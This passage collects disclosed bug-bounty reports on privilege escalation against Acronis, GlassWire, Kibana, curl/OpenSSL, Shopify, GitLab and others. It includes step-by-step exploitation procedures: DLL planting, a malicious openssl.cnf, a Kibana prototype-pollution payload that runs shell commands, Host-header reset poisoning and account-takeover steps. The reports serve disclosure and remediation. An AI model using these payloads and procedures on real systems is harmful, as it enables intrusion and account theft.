  3.  Open `cmd.exe` and execute `msiexec /fa C:\Windows\Installer\installer_name.msi`.  After few seconds a new folder will appear in `%TEMP%`
  4.  Replace `schedule.dll` inside that folder with the `schedule.dll` attachment  in this report
  5.  Wait until the process finishes. After some time a UAC should prompt, just select "no"
  6.  A new cmd should pop up. Type `whoami` to confirm the new privileges


I've also recorded a PoC video in case something it's not clear.

## Recommendations
Do not use local `%TEMP%` to create `schedule.dll`, use `C:\Windows\TEMP`.

## Impact

LPEs like this one are often used by malwares to evade antivirus engines, install rootkits, spread over the network, etc...
A malware author could use this exploit to target Acronis end users.

---

### [[CVE-2020-27194] Linux kernel: eBPF verifier bug in `or` binary operation tracking function leads to LPE](https://hackerone.com/reports/1010340)

- **Report ID:** `1010340`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Internet Bug Bounty
- **Reporter:** @simonscannell
- **Bounty:** 750 usd
- **Disclosed:** 2021-07-23T07:55:40.652Z
- **CVE(s):** CVE-2020-27194

**Vulnerability Information:**

CVE-2020-27194 is a eBPF verifier bug that allows an unprivileged attacker to create BPF socket filter programs that can read and write Out of Bounds, trough which an arbitrary kernel read write can be achieved.

I'm taking the root cause explanation from the patch email:

```
Simon reported an issue with the current scalar32_min_max_or() implementation.
That is, compared to the other 32 bit subreg tracking functions, the code in
scalar32_min_max_or() stands out that it's using the 64 bit registers instead
of 32 bit ones. This leads to bounds tracking issues, for example:
  [...]
  8: R0=map_value(id=0,off=0,ks=4,vs=48,imm=0) R10=fp0 fp-8=mmmmmmmm
  8: (79) r1 = *(u64 *)(r0 +0)
   R0=map_value(id=0,off=0,ks=4,vs=48,imm=0) R10=fp0 fp-8=mmmmmmmm
  9: R0=map_value(id=0,off=0,ks=4,vs=48,imm=0) R1_w=inv(id=0) R10=fp0 fp-8=mmmmmmmm
  9: (b7) r0 = 1
  10: R0_w=inv1 R1_w=inv(id=0) R10=fp0 fp-8=mmmmmmmm
  10: (18) r2 = 0x600000002
  12: R0_w=inv1 R1_w=inv(id=0) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  12: (ad) if r1 < r2 goto pc+1
   R0_w=inv1 R1_w=inv(id=0,umin_value=25769803778) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  13: R0_w=inv1 R1_w=inv(id=0,umin_value=25769803778) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  13: (95) exit
  14: R0_w=inv1 R1_w=inv(id=0,umax_value=25769803777,var_off=(0x0; 0x7ffffffff)) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  14: (25) if r1 > 0x0 goto pc+1
   R0_w=inv1 R1_w=inv(id=0,umax_value=0,var_off=(0x0; 0x7fffffff),u32_max_value=2147483647) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  15: R0_w=inv1 R1_w=inv(id=0,umax_value=0,var_off=(0x0; 0x7fffffff),u32_max_value=2147483647) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  15: (95) exit
  16: R0_w=inv1 R1_w=inv(id=0,umin_value=1,umax_value=25769803777,var_off=(0x0; 0x77fffffff),u32_max_value=2147483647) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  16: (47) r1 |= 0
  17: R0_w=inv1 R1_w=inv(id=0,umin_value=1,umax_value=32212254719,var_off=(0x1; 0x700000000),s32_max_value=1,u32_max_value=1) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  [...]

The bound tests on the map value force the upper unsigned bound to be 25769803777
in 64 bit (0b11000000000000000000000000000000001) and then lower one to be 1. By
using OR they are truncated and thus result in the range [1,1] for the 32 bit reg
tracker. This is incorrect given the only thing we know is that the value must be
positive and thus 2147483647 (0b1111111111111111111111111111111) at max for the
subregs. Fix it by using the {u,s}32_{min,max}_value vars instead
```
The issue was introduced with commit https://github.com/torvalds/linux/commit/3f50f132d8400e129fc9eb68b5020167ef80a244 and patched with commit https://github.com/torvalds/linux/commit/5b9fbeb75b6a98955f628e205ac26689bcb1383e

This means the kernel 5.8.* stable branch was affected by the vulnerability. I wrote a highly reliable LPE exploit for Fedora 33, which used the 5.8.* kernel. Next, week, on october 22nd Ubuntu 22.10 is released which would have been vulnerable as well if I had not reported the vulnerability. Effectively, all distributions could have become affected.
 
Here is a video demonstration of the exploit in action:
{F1039500}

I will publish the exploit after some time has passed.

## Impact

This vulnerability allows for an extremely reliable exploit leading to LPE on default configurations for many distros such as Ubuntu, Debian, Fedora and more.

---

### [Uncontrolled Search Path Element allows DLL hijacking for priv esc to SYSTEM](https://hackerone.com/reports/921675)

- **Report ID:** `921675`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** GlassWire
- **Reporter:** @dawouw
- **Bounty:** 250 usd
- **Disclosed:** 2021-06-04T13:56:55.896Z
- **CVE(s):** -

**Vulnerability Information:**

GlassWire contains a DLL hijacking vulnerability that could allow an authenticated attacker to execute arbitrary code on the targeted system. The vulnerability exists due to GlassWire loading DLL files from the PATH environment variable without verification. The machine should have at least one writable PATH directory for the privilege escalation to work (e.g. having Python, Java, etc. installed).
Nine different DLL's are loaded by the GlassWire Service (GWCtlSrv.exe) as SYSTEM. 
One DLL is loaded by the GUI (GlassWire.exe) as the currently logged in user.

Class: Privilege Escalation [CAPEC-233]
Class: Uncontrolled Search Path Element [CWE-427]

**Affected Product**
GlassWire 2.2.210.0

**Proof of Concept**
Usually, Python is prepended to the PATH environment (Path=C:\Python38\Scripts\;C:\Python38\;..). For my ease and workflow, I prepended my folder to it (C:\Dima\;). Place the [x86 DLL](https://secret.club/2020/04/23/directory-deletion-shell.html) in one of the writable folder paths.


*C:\Program Files (x86)\GlassWire\GWCtlSrv.exe*
GlassWire (32bit) loads the following DLLs during boot as SYSTEM:
- swift.dll
- CSUNSAPI.dll
- nfhwcrhk.dll
- SureWareHook.dll
- aep.dll
- nfhwcrhk.dll
- atasi.dll
- nuronssl.dll
- ubsec.dll

{F904704}
{F904728}


*C:\Program Files (x86)\GlassWire\GlassWire.exe*
Glasswire GUI (32bit) loads the following DLL after user logon as the current user:
- Wtsapi32.dll.dll

{F904730}


I hope this helps. Please let me know if you require more information.

Kind regards,
Dima van de Wouw
[Outflank](https://outflank.nl/)

## Impact

Successful exploitation of the GlassWire service allows an attacker to gain SYSTEM privileges and inject into the GlassWire service process at boot.
Successful exploitation of the GlassWire GUI allows a user to gain persistence. On shared machines, this would allow a user to move laterally to sessions of other users.

---

### [RCE hazard in reporting (via Chromium)](https://hackerone.com/reports/1168765)

- **Report ID:** `1168765`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Elastic
- **Reporter:** @alexbrasetvik
- **Bounty:** 10000 usd
- **Disclosed:** 2021-05-26T14:52:25.723Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** Reporting embeds a Chromium that is susceptible to RCEs

**Description:**

Reporting uses a headless Chromium to generate PNGs and PDFs. This is invoked (at least on Elastic Cloud, ECE and ECK) with `--no-sandbox` to work at all.

There are RCEs readily available for Chrome, and at least the versions shipped with 7.11 and 7.12 are susceptible to the attached example.

Attached is an adaptation of this exploit: https://github.com/rapid7/metasploit-framework/pull/15007/files#diff-42ae645fcacbd90d93296471ac57e1d734544af7fb082efd607db0a29d197ac4R53

I have not been able to devise a complete chain yet (thus the "hazard"), but anything that enables pointing reporting at attacker-controlled JS would be able to pop an RCE this way. HTML-injection or XSS (even with the CSP a HTML injection will enable a redirect) or an open redirect would enable pointing reporting at custom JS code.

## Steps To Reproduce:

  1. Host the attached HTML somewhere, in my case it's available on http://192.168.0.154:8009/alexb-says-hi.html
  1. Point the x-pack reporting-embedded Chromium at it (this step is missing to complete the chain)

Here's an example. The attached HTML file gets `uname -a > /tmp/alexb-says-hi` to be run:

```
$ docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash  
bash-4.4$ cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/
bash-4.4$ ls /tmp/
ks-script-esd4my7v  ks-script-eusq_sc5
bash-4.4$ ./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html
[0419/161441.709455:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.725018:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.727174:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.821129:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
^C # CTRL-C after a few seconds. Reporting would kill it after a timeout
bash-4.4$ ls /tmp/
alexb-says-hi  ks-script-esd4my7v  ks-script-eusq_sc5
bash-4.4$ cat /tmp/alexb-says-hi
Linux bd1b285e33b7 4.19.121-linuxkit #1 SMP Thu Jan 21 15:36:34 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

## Supporting Material/References:

  * HTML-file which when accessed via Reporting's headless Chromium triggers an RCE. (Steps to produce that file via msfconsole is embedded in the HTML file as comments)

## Impact

Kibana is an HTML-injection (even without full-blown XSS) or an open redirect away from being RCE-able via Reporting.

---

### [Privilege Escalation via REST API to Administrator leads to RCE](https://hackerone.com/reports/1107282)

- **Report ID:** `1107282`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** WordPress
- **Reporter:** @hoangkien1020
- **Bounty:** - usd
- **Disclosed:** 2021-05-17T16:34:27.947Z
- **CVE(s):** CVE-2021-21389

**Summary (team):**

Kien Hoang reported a privilege escalation vulnerability in the BuddyPress REST-API. Through this issue, if registrations for new users is enabled, a non-admin user can gain administrator access on the site.

The administrator access can then lead to remote code execution, as admins have the right to run code on the site.

---

### [Subdomain takeover of ████.jitsi.net](https://hackerone.com/reports/1197013)

- **Report ID:** `1197013`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** 8x8
- **Reporter:** @ian
- **Bounty:** - usd
- **Disclosed:** 2021-05-14T17:35:31.575Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
█████.jitsi.net points to an AWS EC2 instance at 18.195.93.116 that no longer exists. I was able to take control of this IP address and run my own EC2 instance. I can now serve content on this domain, obtain a TLS certificate for this domain, etc.

If any customers or servers are pointing to anything within this domain, I could serve them arbitrary/malicious content. I could also use this in case your domain whitelists your own domain for OAuth, or if there are cookies scoped to the entire domain. Usually this can have a high impact.

```
% dig +short ██████.jitsi.net
18.195.93.116

% curl ██████████.jitsi.net
<!-- hackerone.com/ian -->
```

## Impact

Subdomain takeover

---

### [Request Access for Uber Device Returns Management Platform (https://www.eats-devicereturns.com/request-access/) Bypass Allows Access to PII](https://hackerone.com/reports/1010787)

- **Report ID:** `1010787`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Uber
- **Reporter:** @hunt4p1zza
- **Bounty:** - usd
- **Disclosed:** 2021-05-14T17:24:53.061Z
- **CVE(s):** -

**Summary (team):**

The hacker identified a registration page on a website ran by a 3rd party for Uber for managing Uber Eats devices, for example devices' returns when they stop working. Due to the authentication not being integrated with Uber's central authentication, the website was interesting. Although the registration page only allowed emails under uber.com to register it was possible to register a similar domain name that satisfied the backend checks (likely a loose regular expression check) to create an account. It was then possible to access site content, as well as gain control of the whole platform due to flat access control.

**Summary (researcher):**

The hacker identified a registration page on a website ran by a 3rd party for Uber for managing Uber Eats devices, for example devices' returns when they stop working. Due to the authentication not being integrated with Uber's central authentication, the website was interesting. Although the registration page only allowed emails under `uber.com` to register it was possible to register a similar domain name that satisfied the backend checks (likely a loose regular expression check) to create an account. It was then possible to access Uber staff and customers information, as well as gain control of the whole platform due to flat access control.

---

### [Subdomain takeover of ███.wavecell.com](https://hackerone.com/reports/1181762)

- **Report ID:** `1181762`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** 8x8
- **Reporter:** @ian
- **Bounty:** - usd
- **Disclosed:** 2021-05-02T04:28:49.054Z
- **CVE(s):** -

**Summary (team):**

An EC2 instance was terminated but the DNS record was initially not updated/removed. The issue has been rectified.

---

### [Remote Code Execution in coming Kibana 7.7.0](https://hackerone.com/reports/861744)

- **Report ID:** `861744`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Elastic
- **Reporter:** @alexbrasetvik
- **Bounty:** 5000 usd
- **Disclosed:** 2021-04-19T21:46:03.513Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

Kibana 7.7.0 as per commit [c5f682cb](https://github.com/elastic/kibana/commits/c5f682cb) is vulnerable to a remote code execution vulnerability that is similar to the one reported in https://hackerone.com/reports/852613

Kibana 7.7.0 is not released, so this is an experiment. I know that getting these reports is more valuable to Elastic prior to a release, as the amount of work growing out of a critical vulnerability like this is a lot more _after_ release. It could possibly be more valuable for me to wait until Cloud actually has the release and clearly is in scope, but I have faith in you wanting to encourage people to actually look at code whose release is imminent, so here's the report pre release.

I saw that you have commited the fixes to my previous report: https://github.com/elastic/kibana/commit/68674568efac9070935f07e55dfd1a9f8482663d That fix is part of commit c5f682cb which the following is tested with.

**Description:**

There is a prototype pollution in the new "SIEM signal" feature: https://github.com/elastic/kibana/blob/master/x-pack/plugins/siem/server/lib/detection_engine/signals/bulk_create_ml_signals.ts#L58

The attached recording shows how to exercise this code via a SIEM detection rule. The following JSON-blob is an export of the detection rule used:

```
{"actions":[],"created_at":"2020-04-28T17:19:42.955Z","updated_at":"2020-04-28T18:02:32.489Z","created_by":"elastic","description":"test","enabled":true,"anomaly_threshold":0,"false_positives":[],"from":"now-108015s","id":"ac26797b-9061-485c-889c-79993ca8e209","immutable":false,"interval":"15s","rule_id":"2a5a3f8e-79a9-4101-99d9-b414ed48c0db","output_index":".siem-signals-default","max_signals":100,"machine_learning_job_id":"linux_anomalous_network_activity_ecs","risk_score":50,"name":"test","references":[],"meta":{"from":"30h","kibana_siem_app_url":"https://localhost:5601/app/siem"},"severity":"low","updated_by":"elastic","tags":[],"to":"now","type":"machine_learning","threat":[],"throttle":"no_actions","version":3}
{"exported_count":1,"missing_rules":[],"missing_rules_count":0}
```

If I create a fake ML-anomaly like follows, I can pollute the prototype:

```
PUT /.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly?refresh
{
  "timestamp": 1588093630045,
  "result_type": "record",
  "record_score": 1,
  "job_id": "linux_anomalous_network_activity_ecs",
  "by_field_name": "field_name",
  "by_field_value": "field_value",
  "influencers": [
    {"influencer_field_name": "foo.__proto__.sourceURL", "influencer_field_values": "\u2028\u2029\n;global.process.mainModule.require('child_process').exec('say pwned && open https://www.youtube.com/watch?v=LUsiFV3dsK8')"}
    ]
}
```

Note that the timestamp might need adjusting, as the SIEM rule only looks 30h back in the past as provided.

## Steps To Reproduce:

  1. Import the provided SIEM detection rule.
  1. Create the fake anomaly provided above.
  1. Enable the rule. Sometimes disabling and re-enabling it is necessary, which is probably a bug in itself.
  1. Wait ~15 seconds for the rule to be evaluated, which should execute the code, which on a Mac will cause "pwned" to sound and the youtube clip to open.

## Supporting Material/References:

  * Video walkthrough attached.

## Impact

A user with write access to these indexes (like any Cloud user would have) can achieve full remote code execution.

---

### [Password Reset link hijacking via Host Header Poisoning leads to account takeover](https://hackerone.com/reports/1108874)

- **Report ID:** `1108874`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hemantsolo
- **Bounty:** - usd
- **Disclosed:** 2021-04-02T18:51:48.573Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
████████ uses the Host header when sending out password reset links. This allows an attacker to insert a malicious host header, leading to password reset link / token leakage.

## References
http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
https://hackerone.com/reports/226659

## Impact

The victim will receive the malicious link in their email, and, when clicked, will leak the user's password reset link / token to the attacker, leading to full account takeover.

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1.) Open up Firefox and Burp Suite.
2.) Visit the forgot password page (http://██████/█████)
3.) Enter the victim's email address and click on SEND RESET LINK.
4.) Intercept the HTTP request in Burp Suite & change the Host Header to your malicious site/server ex. ███.
5.) Forward the request and you'll be redirected to your server.

The victim will then receive a password reset e-mail with your poisoned link.
If the victim clicks the link, the reset token will be leaked and the attacker will be able to find the reset token in the server logs. The attacker can then browse to the reset page with the token and change the password of the victim account!

## Suggested Mitigation/Remediation Actions
Use $_SERVER['SERVER_NAME'] rather than $_SERVER['HTTP_HOST']

---

### [Arbitrary file creation via symlink attack on syncagentsrv (Acronis Sync Agent Service)](https://hackerone.com/reports/945122)

- **Report ID:** `945122`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Acronis
- **Reporter:** @adr
- **Bounty:** - usd
- **Disclosed:** 2021-03-16T09:45:40.740Z
- **CVE(s):** -

**Vulnerability Information:**

# Issue class description
Arbitrary file creation is a vulnerability that allows attacker to create file in arbitrary location within filesystem. This includes protected directories, such as C:\Windows, C:\windows\system32 and "C:\Program Files". If in addition, attacker has control over the file content, it is possible to create DLL file which will be loaded by known operating system components and will result in Privilege Elevation to Local System (the highest level of privileges on local Windows system).

There are many known paths for this attacks, e.g. every desktop version of Windows will periodically run "schedule" service. The service will try to load non-existing library named WptsExtensions.dll. If attacker manages to plant custom version of this library, the code will be executed with highest privileges and can be used to add new administrative user or start reverse shell. The issue can be force by triggering system reboot as well. More details can be found here: https://itm4n.github.io/windows-dll-hijacking-clarified/

To perform this attack, typically we need privileged process that blindly follows symlinks (reparse points), without verifying destination. NTFS symlinks require extra privileges, but attacker can use other kind of symlinks: directory junctions mixed with object directory symlinks. The ready to use solution is hosted on Google's Project Zero's github: https://github.com/googleprojectzero/symboliclink-testing-tools

CreateSymlink.exe binary used in this attack originates from this source and can be downloaded to reproduce the attack.

# Affected software
Following True Image installer was used:
{F926995}

The vulnerable service is syncagentsrv ("C:\Program Files (x86)\Common Files\Acronis\SyncAgent\syncagentsrv.exe")

When service is running, it logs information into C:\ProgramData\Acronis\SyncAgent\logs\syncagent.log file. The file is not exclusively opened, nor protected, and can be deleted at any time. The C:\ProgramData\Acronis\SyncAgent\logs\ directory remains empty, thus can be transformed into directoy junction and symlink.

Once new entry is added to the log, the write operation will follow the symlink and write into arbitrary location. Attacker also controls the name of resulting file. The resulting file grants full control to EVERYONE, hence it is trivial to replace its content with custom code. 

{F927005}

The attack has been confirmed on my local system (when proper libraries were targeted) and I was able to elevate privileges.

# Steps to reproduce
1. Delete C:\ProgramData\Acronis\SyncAgent\logs\syncagent.log file. Make sure that directory is now empty.
2. Use following command to create symlink: `CreateSymlink.exe C:\ProgramData\Acronis\SyncAgent\logs\syncagent.log C:\Windows\system32\WptsExtensions.dll`
3. Wait for data to be written into the log or force it by triggering system reboot. After the reboot verify successful file creation.
4. Replace new file content (C:\Windows\system32\WptsExtensions.dll) with custom DLL functionality - e.g. adding administrative user or spawning remote shell connection.
5. Reboot again to trigger Windows Scheduler loading new dll.

## Impact

Low privileged user can overwrite any file in the system (this could lead to DoS) or create arbitrary files anywhere on the system. By creating arbitrary DLL, then replacing its content with custom code, user can elevate privileges up to Local System (the highest Windows privilege).

---

### [DNS Misconfiguration (Subdomain Takeover) █.staging.█.8x8.com](https://hackerone.com/reports/1108125)

- **Report ID:** `1108125`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** 8x8
- **Reporter:** @melbadry9
- **Bounty:** - usd
- **Disclosed:** 2021-02-28T03:44:38.632Z
- **CVE(s):** -

**Summary (team):**

An EC2 instance was terminated but the DNS record was initially not updated/removed. The issue has been rectified.

**Summary (researcher):**

Same technique mentioned on https://melbadry9.medium.com/dangling-dns-aws-ec2-e2d801701e8

---

### [DNS Misconfiguration (Subdomain Takeover) ███.wavecell.com](https://hackerone.com/reports/1089502)

- **Report ID:** `1089502`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** 8x8
- **Reporter:** @melbadry9
- **Bounty:** - usd
- **Disclosed:** 2021-02-15T03:21:29.748Z
- **CVE(s):** -

**Summary (team):**

An S3 bucket was deleted, but a DNS record pointing to the bucket was initially not updated/removed. The issue has been rectified.

---

### [DNS Misconfiguration (Subdomain Takeover) ███████.8x8.com](https://hackerone.com/reports/1101877)

- **Report ID:** `1101877`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** 8x8
- **Reporter:** @melbadry9
- **Bounty:** - usd
- **Disclosed:** 2021-02-12T16:49:59.257Z
- **CVE(s):** -

**Summary (team):**

An EC2 instance was replaced but the DNS record was initially not updated/removed. The issue has been rectified.

**Summary (researcher):**

https://medium.com/bugbountywriteup/dangling-dns-aws-ec2-e2d801701e8

---

### [curl on Windows can be forced to execute code via OpenSSL environment variables](https://hackerone.com/reports/714215)

- **Report ID:** `714215`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** curl
- **Reporter:** @supersausage
- **Bounty:** - usd
- **Disclosed:** 2021-02-08T07:54:17.110Z
- **CVE(s):** CVE-2019-1552, CVE-2019-5443

**Vulnerability Information:**

Preface: While I have an interest in security, I am not a professional security researcher, so please be forgiving of any lack of convention in this submission. The intent is to help improve security of the OpenSSL and curl projects, their consumers and end users. I will be sending this same content to both projects, curl via hackerone, and OpenSSL via openssl-security@openssl.org, per directions at each maintainer website.

I'm writing with regard to:
 - OpenSSL CVE-2019-1552
 - curl CVE-2019-5443
 
Background:
 - The root of each of these is that a default path in the OpenSSL build system for Windows targets is a location writable by a non-privileged user, and that OpenSSL configuration files placed there can change the behavior of OpenSSL, including code execution and escalation of privilege.
 - A PoC for code execution and escalation of privilege was published at:
   https://hackerone.com/reports/608577
 - This PoC uses a dynamic engine definition in such an OpenSSL configuration file to load a DLL in the security context of the application integrating the OpenSSL library, whose DLL_PROCESS_ATTACH handler inside DllMain can execute code in that context. This permits a non-elevated user to deploy code that may be executed by an elevated application.
 
Context of this email:
 - I am currently working with OpenSSL 1.0.2t as a LTS solution.
 - I have not tested or substantially researched other branches at this time.
 
Summary of current status:
 - OpenSSL project appears to have:
   - Designated CVE-2019-1552 as "Low" severity, even though the issue allows for EoP and potentially degrading the communication security intent of integrating applications, e.g. via inserting CA certificates.
   - At a high level, stated as "Fixed in OpenSSL 1.0.2t" (https://www.openssl.org/news/vulnerabilities.html) by this commit:
     https://github.com/openssl/openssl/commit/d333ebaf9c77332754a9d5e111e2f53e1de54fdd
	 The fix is, however, a fix to documentation, and changes in the build script that add a sample  for --prefix that is similarly insecure.
 - curl project appears to have:
   - Recommended that users update to 7.65.1_2
   - Stated that this commit "completely disables curl's ability to load an OpenSSL config when invoked."
     https://github.com/curl/curl-for-win/commit/51b658a76594942cf1d6f227d8fc4732bb8ec277
	 

My contentions:

 (A) The statement that CVE-2019-1552 was "Fixed in OpenSSL 1.0.2t" is extremely misleading, and could likely lead to users of the project updating OpenSSL without realizing that additional changes are required on their part. 

 (B) The sample "--prefix=c:/some/openssl/dir" is equally as vulnerable as the default, but more significantly, it is difficult to conceive of a path that is actually safe to use, and this might not be obvious to all developers. For example:
 
  - C:\Windows\System32 - Windows may not always be installed on drive letter 'C', leaving a hard-coded path similarly vulnerable on some systems
  - C:\Program Files - This path can be localized (e.g. "Programmes" in French-native installations), leaving a hard-coded path similarly vulnerable on some systems
    
  The OpenSSL code does not support passing an environment variable for runtime resolution, which would be a still vulnerable option, not least because Configure.pl will modify any path that is not an absolute path with drive letter, or one beginning with "/":

    $openssldir=$prefix . "/" . $openssldir if $openssldir !~ /(^\/|^[a-zA-Z]:[\\\/])/;
    
  One of few "safer" options I could think of was passing --prefix=\NUL --openssldir=\NUL, which should lead to a path or compound path after Configure.pl that is guaranteed to be invalid or else contain no content under Windows.
    
  In fact, in the aforementioned hackerone thread, "vsz" alludes to the fact that the fix in curl is not guaranteed:
    
  "After further experiments, I managed to tweak the build so that engine support can be kept enabled, and OpenSSL be built with a secure prefix. The trick was to use C:/Windows/System32/OpenSSL. This location can be fairly assumed to be a restricted directory on majority of installs and on all default installs going back a long time."
    
  Per above, this in not true unless Windows is installed on the 'C' drive. These are supposed to be projects implementing security, potentially integrated into end products distributed to millions of users with varying OS configurations. I personally would not call this "fixed". "Hardened", perhaps.
  
  (C) This still does not make the OpenSSL library safe, and I believe curl CVE-2019-5443 is actually *not fixed*, because the OpenSSL will read the path to configuration data from the OPENSSL_CONF environment variable.
  
  I downloaded curl 7.66.0 from:

    https://curl.haxx.se/windows/dl-7.66.0_2/curl-7.66.0_2-win32-mingw.zip
    
  I could compile and execute the same PoC as provided in the hackerone thread simply by setting the user-level environment variable:

    OPENSSL_CONF=C:\test\openssl.cnf
    
  The OpenSSL library used by curl (and other third-party apps who integrate it), will read this environment variable before the hard-coded path. Windows does not elevation to set user-level environment variables, and child processes can inherit them. This means that any elevated application using the OpenSSL library started from a compromised user account can be used as a EoP technique in the same way as before. For example, if OPENSSL_CONF is set at the user level, and the user signs out and later signs in again, the shell (Explorer.exe) inherits this environment variable, as does any process the user elevates.
    
  I have not tested, but if, as the text on the OpenSSL vulnerabilities page alludes to, this also allows someone to "insert CA certificates, modify (or even replace) existing engine modules", this same issue potentially weakens the communications secrecy of integrating apps.
    
  Aside: I see various places in the OpenSSL library code where other environment variables are queried, and I do not have time to evaluate each for potential issues.

## Impact

The attacker could run code in the context of an elevated process if they can modify user-level environment variables, or when Windows is not installed on the C drive.

Essentially, this report is that issues similar to CVE-2019-5443 persist in curl 7.66.0.

---

### [Arbitrary DLL injection in mmsminisrv (Acronis Managed Machine Service Mini)](https://hackerone.com/reports/944735)

- **Report ID:** `944735`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Acronis
- **Reporter:** @adr
- **Bounty:** - usd
- **Disclosed:** 2020-10-20T14:41:30.054Z
- **CVE(s):** -

**Vulnerability Information:**

During initialization, **mms_mini.exe** (service binary of mmsminisrv) loads library *C:\Program Files (x86)\Common Files\Acronis\Home\libssl10.dll*. The library then tries to load non-existing file: *C:\bs_hudson\workspace\mod-openssl-fips-win\205\product\out\standard\vs_2013_release\OpenSSL\ssl\openssl.cnf*. The path seems to be hardcoded leftover from compilation. 
{F926518}

Because by default any user is able to create directories  on C:\ drive, it is possible to create missing directories and missing file (*openssl.cnf*). The OpenSSL config file implements support for loading additional DLL modules. Attacker may point to arbitrary DLL which will be loaded by service running with Local System privileges. Once service is restarted (e.g. due to system reboot), the planted library is loaded by the service and arbitrary code is executed. The code would typically add new Administrative user to the Windows system or establish reverse shell connection.

Successful injection of arbitrary library is shown on procmon log:
{F926535}

# Steps to reproduce
1. Create directories: ```mkdir C:\bs_hudson\workspace\mod-openssl-fips-win\205\product\out\standard\vs_2013_release\OpenSSL\ssl```
2. Inside, create openssl.cnf file with following content (replace DLL path with any path you wish):
    
    ``` 
openssl_conf = openssl_init
[openssl_init]
engines = engine_section
[engine_section]
woot = woot_section
[woot_section]
engine_id = woot
dynamic_path = c:\\temp\\cqbeacondll.dll
init = 0
    ```
3. Plant arbitrary DLL under *dynamic_path* location.
4. Wait for service to start (or force it by rebooting system)

## Impact

After successful attack, low privileged local user can elevate privileges up to Local System (the highest Windows privilege). The vulnerability can be also exploited by malware with local system access.

---

### [Email Confirmation Bypass in your-store.myshopify.com which leads to privilege escalation](https://hackerone.com/reports/910300)

- **Report ID:** `910300`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Shopify
- **Reporter:** @say_ch33se
- **Bounty:** - usd
- **Disclosed:** 2020-09-15T06:47:43.076Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Shopify, I have found a bug by which I can verify any email on .myshopify.com, the bug is very strange but it works. Also I can take over the accounts but only the ones which do not have SSO.

To reproduce please follow the steps exactly as I written otherwise you will not be able to reproduce it.

Steps to reproduce: 

1. Go to your partners account and make a store
{F886149}

2. Go to your new store and don't verify email, then go to admin/settings/account/youraccountnumber
{F886151}

3. Change your email to victims email(in my case say_ch33se+111@wearehackerone.com)
{F886138}

4. Go to burps match and replace and replace your email with the email you want to takeover(in my case say_ch33se+111@wearehackerone.com)
{F886137}
{F886139}
{F886140}

5. Refresh the account page so its updated with victims email
{F886141}

6. Still on accounts page click on Upload photo and upload any photo and save
{F886142}

7. After that uncheck match and replace, refresh and on accounts page change email to your email which you own so you can get a confirmation email
{F886143}

8. In burp check match and replace again to replace your email with the email you want to takeover(same as above)
9. Go to your email which you own where is the confirmation link and click on it(in the browser where you are already logged in)
10. On that page where you verified email, upload another image
{F886144}

11. Now click on Review accounts
12. Enter stores password and you'll be greeted with Shopify ID
13. Click on Set up Shopify ID
{F886145}

14. And there you got it
{F886146}

15. Click continue and set up password
{F886147}
{F886148}

16. Now you can access vitims store and partner account without any problems

## Impact

Ability to confirm any email on your-store.myshopify.com and leverage SSO to take over accounts.

**Summary (team):**

On June 28th, @say_ch33se reported that it was possible to bypass Shopify's email verification for legacy accounts. Doing so would have allowed a user to access accounts they did not own. 

Our team immediately deployed a change to address this issue. Additionally, we have removed the ability to verify email addresses for legacy accounts. A code to confirm email ownership at the time of merging from a legacy account is now required.

---

### [Privilege escalation from any user (including external) to gitlab admin when admin impersonates you](https://hackerone.com/reports/493324)

- **Report ID:** `493324`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** GitLab
- **Reporter:** @skavans
- **Bounty:** - usd
- **Disclosed:** 2020-08-26T14:10:18.484Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Hey team,
I have discovered a way for any logged in user (attacker) to escalate his privileges to gitlab administrator if the real gitlab administrator impersonates attacker's account.

**Description:**
When the gitlab admin impersonates some user, he gets new `_gitlab_session` cookie and then clicking at `Stop impersonating` he gets his own admin's cookie back. The vulnerability is that the impersonated user (attacker in our case) can see impersonated session at the `Active sessions` so he can switch to it (manually setting it in cookie) and click `Stop impersonating` by himself. This is a way how he can become gitlab administrator.

## Steps To Reproduce:

1. Sign into gitlab app as some user (`attacker`)
